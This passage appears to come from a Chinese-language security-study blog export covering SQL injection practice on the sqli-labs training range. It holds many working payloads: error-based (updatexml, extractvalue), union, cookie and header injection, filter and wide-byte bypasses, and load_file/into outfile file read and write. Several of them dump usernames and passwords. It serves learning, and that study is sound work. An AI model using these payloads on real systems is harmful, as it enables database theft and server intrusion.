+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
+<blockquote>
+<p>XPATH syntax error: ‘^id,username,password’</p>
+</blockquote>
+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
+<blockquote>
+<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
+</blockquote>
+<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
+<blockquote>
+<p>Column count doesn’t match value count at row 1</p>
+</blockquote>
+<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
+<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
+</blockquote>
+<p>所以要闭合VALUES.</p>
+<p>利用$uagent，故构建格式，1’,1,1)#</p>
+<p>则：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
+</blockquote>
+<p>即：</p>
+<blockquote>
+<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
+</blockquote>
+<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
+<blockquote>
+<p>  XPATH syntax error: ‘^security’</p>
+</blockquote>
+<p>其余语句类似思路1。</p>
+<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
+<p>admin’，有报错信息…LIMIT..</p>
+<p>注释掉后，即admin’#，页面正常。</p>
+<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
+<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
+<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
+<p>嗯，报错注入也是可行的</p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-tips</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
+    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
+
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
+<p><strong>;%00</strong>代替–+进行注释</p>
+<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
+<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
+<p>没括号则是id&#x3D;2页面</p>
+<p><img src="/../../../Typora/img111/image-20230523131633798.png" alt="image-20230523131633798"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
+<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
+<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
+</blockquote>
+<blockquote>
+<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
+</blockquote>
+<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过</p>
+<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
+<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
+<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
+<p><strong>mysql_real_escape_string() 函数</strong></p>
+<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
+<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
+<ul>
+<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
+<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
+</ul>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<blockquote>
+<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
+<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
+<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p><code>limit m,n</code></p>
+<p>其中，m是偏移量，n是要查询的数量。</p>
+<blockquote>
+<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
+</blockquote>
+<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
+<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
+<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>Mysql爆破语句</tag>
+        <tag>注入绕过</tag>
+        <tag>sql注入技巧</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
+<p><strong>extravtvalue()</strong></p>
+<p>floor()、rand()…主键重复方式，暂时不展开</p>
+<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
+<blockquote>
+<p>XML_document:是字符串String格式，为XML文档对象名称</p>
+<p>Xpath_string:Xpath格式的字符串</p>
+<p>new_value:string格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>报错注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
+<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
+<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
+<p>1、    判断注入点</p>
+<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
+<p>2、    判断<strong>闭合</strong>形式</p>
+<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
+<p>3、判断查询列数</p>
+<p>1’ order by 1–+</p>
+<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
+<p>4、判断显示位</p>
+<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
+<p>常用语句为-1’ union select 1,2,3–+</p>
+<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
+<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
+<p>5、获取所有数据库名</p>
+<p>6、获取数据库所有表名</p>
+<p>7、获取字段名 </p>
+<p>8、获取字段中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>联合注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入总述</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E8%BF%B0/</url>
+    <content><![CDATA[<h1 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h1><h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230524231210348.png" alt="image-20230524231210348"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522161221724.png" alt="image-20230522161221724"></p>
+<p>答案是bc，a错在注入点在y上了；d与问题无关</p>
+<p><strong>总结</strong>：注入点是谁，就要将语句写在其后面</p>
+<h2 id="a-Mysql结构"><a href="#a-Mysql结构" class="headerlink" title="a)Mysql结构"></a>a)Mysql结构</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522163119227.png" alt="image-20230522163119227"></p>
+<p>Mysql数据库</p>
+<p>数据库A&#x3D;网站A&#x3D;数据库用户A</p>
+<p>​		表名</p>
+<p>​				列名</p>
+<p>​						数据</p>
+<p>数据库B&#x3D;网站B&#x3D;数据库用户B</p>
+<p>​		…</p>
+<p>如上，一个站一个数据库用户，即使A站有漏洞，不影响B站使用，但是嘞，如果是root用户高权限可以跨库了。</p>
+<p>相关知识点：</p>
+<p>1.为了得到数据，需要库-&gt;表-&gt;列</p>
+<p>2.所谓的数据库高低版本，即在Mysql库5.0及以上版本中，存在information_schema库，它记录了所有数据库名，表名，列名。</p>
+<p>3.数据库中的”.”代表下一级，如admin.user，即admin库下的user表</p>
+<p>4.information_schema.tables&#x2F;columns；记录的所有表名&#x2F;列名信息</p>
+<p>​	table_schema库名；	</p>
+<p>​	table_name表名;</p>
+<p>​	column_name()列名；</p>
+<p>这些知识点，在sql-labs实践时得到体现。</p>
+<h3 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h3><p>老办法：id&#x3D;1 and 1&#x3D;1页面正常 与id&#x3D;1 and 1&#x3D;2页面错误</p>
+<p>快方法：id&#x3D;1asdsad，页面错误，就加上其它的字符，对页面有影响</p>
+<p>注意：404错误和500跳转的话，那就是特殊情况咯</p>
+<h3 id="简单注入之联合查询"><a href="#简单注入之联合查询" class="headerlink" title="简单注入之联合查询"></a>简单注入之联合查询</h3><h4 id="猜解准备"><a href="#猜解准备" class="headerlink" title="猜解准备"></a>猜解准备</h4><ol>
+<li>猜解列名数量(字段数) order by x 页面正常否</li>
+<li>id &#x3D;-1 union select 1,2,…,x  id&#x3D;-1查询不存在后，才会回显后面的1,2,3…x位置</li>
+</ol>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>将数字替换成version()、database()、user()、@@version_compile_os()…</p>
+<h3 id="高权限下的跨库查询（即指定x库x表下的数据）"><a href="#高权限下的跨库查询（即指定x库x表下的数据）" class="headerlink" title="高权限下的跨库查询（即指定x库x表下的数据）"></a>高权限下的跨库查询（即指定x库x表下的数据）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
+
+<p>group_concat是多个拼接显示；或者可用limt x,1变动猜解</p>
+<h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><h4 id="路径获取常见方法："><a href="#路径获取常见方法：" class="headerlink" title="路径获取常见方法："></a>路径获取常见方法：</h4><p>load_file()：读取函数</p>
+<p>into outfile或into dumpfile：导出函数</p>
+<p><code>select load_file(&#39;d:/test/1.txt&#39;)</code></p>
+<p><code>select &#39;x&#39; into outfile &#39;d:/www.txt&#39;;</code>（需要配置file权限）</p>
+<p>即Mysql下的my.ini文件中加入secure_file_priv&#x3D;’’，重启mysql即可</p>
+<p><code>?id=-1%20union%20select%201,load_file(%27D:\\phpstudy_pro\\WWW\\sqli\\1.txt%27),3</code>  <strong>读取文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522185816516.png" alt="image-20230522185816516"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522190256745.png" alt="image-20230522190256745"></p>
+<p><code>?id=-1%20union%20select%201,%27x%27,3%20into%20outfile%20%20%27D:\\phpstudy_pro\\WWW\\sqli\\2.txt%27 --+</code><strong>写入文件</strong>；–+是注释掉后面的LIMIT</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230522191240332.png" alt="image-20230522191240332"></p>
+<h4 id="路径获取常见方法：-1"><a href="#路径获取常见方法：-1" class="headerlink" title="路径获取常见方法："></a>路径获取常见方法：</h4><p>报错显示；</p>
+<p>遗留文件；(phpinfo.php啥的)</p>
+<p>漏洞报错；</p>
+<p>平台配置文件；（什么.ini之类的）</p>
+<p>爆破等；</p>
+<h4 id="常见读取文件列表："><a href="#常见读取文件列表：" class="headerlink" title="常见读取文件列表："></a>常见读取文件列表：</h4><h3 id="防注入相关"><a href="#防注入相关" class="headerlink" title="防注入相关"></a>防注入相关</h3><h4 id="魔术引号开关："><a href="#魔术引号开关：" class="headerlink" title="魔术引号开关："></a>魔术引号开关：</h4><p>magic_quotes_gpc&#x3D;off</p>
+<p>当它为On时，输入数据中的引号、反斜线、NULL均被加上反斜线，效果同addslashes()</p>
+<p>所以就用编码或宽字节绕过了。</p>
+<p>编码之后，括号里就不用单引号了。即load_file(<strong>‘路径’</strong>)变为load_file(编码)即可</p>
+<h4 id="内置函数-int"><a href="#内置函数-int" class="headerlink" title="内置函数:int"></a>内置函数:int</h4><p>是指，对输入变量进行类型判断，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (is_int($var_name1)) </span><br><span class="line">&#123;    </span><br><span class="line">拼接sql语句，执行sql语句</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">报错啥的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这种就别想着绕过了吧。所以强类型语言其实很少有sql注入？</p>
+<h4 id="自定义关键字-select"><a href="#自定义关键字-select" class="headerlink" title="自定义关键字:select"></a>自定义关键字:select</h4><p>是指，比如str_replace()，替换输入中的select，所以一般大小写绕过或双写</p>
+<h2 id="b-类型及提交注入"><a href="#b-类型及提交注入" class="headerlink" title="b)类型及提交注入"></a>b)类型及提交注入</h2><h3 id="前景引入"><a href="#前景引入" class="headerlink" title="前景引入"></a>前景引入</h3><p>id&#x3D;1; 数字型</p>
+<p>name&#x3D;’zifu’ 字符型</p>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$name=$_GET[&#x27;x&#x27;]</span><br><span class="line">$sql=&quot;select * from user where name=&#x27;$name&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>此时，?x&#x3D;yuleiyun and 1&#x3D;1</p>
+<p>会出现select … name&#x3D;<strong>‘yuleiyun and 1&#x3D;1’</strong></p>
+<p>故引出了闭合条件。（也是一种参数类型，即非数字型注入，都需要闭合）</p>
+<h3 id="明确参数类型"><a href="#明确参数类型" class="headerlink" title="明确参数类型"></a>明确参数类型</h3><p>数字；</p>
+<p>字符；</p>
+<p>搜索；（like 模糊查询 name&#x3D;’%ring%’）</p>
+<p>Json；</p>
+<p>…</p>
+<h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>get;（url）</p>
+<p>post;</p>
+<p>cookie;</p>
+<p>http代理;</p>
+<p>referer;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$get =$_GET[&#x27;a&#x27;];//参数a为get请求方式，以url提交</span><br><span class="line">echo $get;</span><br><span class="line">$post=$_POST[&#x27;b&#x27;];//参数b为post请求方式，bp上提交</span><br><span class="line">echo $post;</span><br><span class="line">$c=$_COOKIE[&#x27;c&#x27;];//参数c为cookie请求方式(其实COOKIE是可以接收到GET请求或POST请求的啊，以后的COOKIE注入)，bp上提交</span><br><span class="line">echo $c;</span><br><span class="line">$r=$_REQUEST[&#x27;r&#x27;];//参数r为request请求方式（REQUEST可以接收GET或POST）</span><br><span class="line">echo $r;</span><br><span class="line">$s=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];//具体见$_SERVER详解</span><br><span class="line">echo $s;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>具体体现为:url中….?a&#x3D;123&amp;b&#x3D;345，页面只会显示123</p>
+<p>而要显示参数b，需要进行post请求，即在bp中，体现为，在请求体中输入b&#x3D;345;</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523122704138.png" alt="image-20230523122704138"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523125650035.png" alt="image-20230523125650035"></p>
+<p>手动更改方框处的GET变为POST不会有变化，需要右键<strong>change request method</strong>才可以，注意get请求下的参数要显示，需要在url位置上搭配**?**，即使在post下也会显示。</p>
+<p>嫌麻烦的话，针对post请求，<strong>hackbar工具</strong>也有同样效果</p>
+<p>sqli-labs:</p>
+<p>less 5,6(字符型注入);</p>
+<p>less 11(post提交);</p>
+<p>less 20(cookie注入);</p>
+<p>less 18(http头部注入);</p>
+<h3 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h3><p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”。</p>
+<p>json格式为，post中，输入json&#x3D;{“usename”:”admin”}</p>
+<h2 id="c-查询方式及报错盲注"><a href="#c-查询方式及报错盲注" class="headerlink" title="c)查询方式及报错盲注"></a>c)查询方式及报错盲注</h2><h3 id="查询方式："><a href="#查询方式：" class="headerlink" title="查询方式："></a>查询方式：</h3><h4 id="select-查询"><a href="#select-查询" class="headerlink" title="select 查询"></a>select 查询</h4><p><code>select * from users where id=$id; </code></p>
+<p>显示数据</p>
+<h4 id="insert-添加"><a href="#insert-添加" class="headerlink" title="insert 添加"></a>insert 添加</h4><p><code>insert into users(a,b,c) values(1,&#39;x&#39;,3); </code></p>
+<p>用户注册添加时</p>
+<h4 id="delete-删除"><a href="#delete-删除" class="headerlink" title="delete 删除"></a>delete 删除</h4><p><code>delete from users where id=$id; </code></p>
+<p>后台管理，删除文章或用户等操作</p>
+<h4 id="update-更新"><a href="#update-更新" class="headerlink" title="update 更新"></a>update 更新</h4><p><code>update user set pwd=&#39;pd&#39;  where id=1 and username=&#39;admin&#39;; </code></p>
+<p>同步或缓存操作</p>
+<h4 id="order-by-排序"><a href="#order-by-排序" class="headerlink" title="order by 排序"></a>order by 排序</h4><h4 id="查询总结："><a href="#查询总结：" class="headerlink" title="查询总结："></a>查询总结：</h4><p>根据不同查询方式和网站应用关系去猜解注入</p>
+<h3 id="报错盲注："><a href="#报错盲注：" class="headerlink" title="报错盲注："></a>报错盲注：</h3><h4 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h4><p>当注入时，获取的数据不回显在前端时，进行报错盲注</p>
+<h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><h5 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h5><blockquote>
+<p>regexp;</p>
+<p>substr;</p>
+<p>like;</p>
+<p>like ‘wh%’</p>
+<p>ord&#x2F;ascii;</p>
+<p>ascii(x)&#x3D;97 x的ascii码是否是97</p>
+<p>left;</p>
